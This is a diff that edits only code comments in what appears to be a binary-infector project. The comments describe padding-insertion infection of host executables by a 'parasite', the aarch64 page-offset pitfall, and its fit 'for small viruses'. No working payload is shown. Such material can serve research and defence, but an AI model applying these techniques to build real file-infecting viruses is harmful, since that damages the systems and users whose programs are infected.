@@ -29,14 +29,20 @@ namespace vt::infector {
 // (padding insertion), for arm's adrp insruction it will break if the parasite
 // refers to rodata.
 // For example:
+//
 //    adrp	x0, 0x0
 //    add x0, x0, #0x544 (compiler generated page offset.)
+//
 // If the code is inserted at a place that is not a multiple of 4k, the
 // generated offset would be wrong.
+//
 // Make sure the parasite doesnt merge text with rodata for aarch64 if this
 // infection method is used. This is not a problem for x86-64 because the
 // lea offset(%rip),%rdi can be relocated safely even to places that are not
 // page aligned.
+//
+// This algorithm is simple to implement, and hard to go wrong but the success
+// rate depends highly on the padding size. For small viruses this is a choice.
 class PaddingInfect {
  public:
   size_t injected_host_size() { return host_size_; }
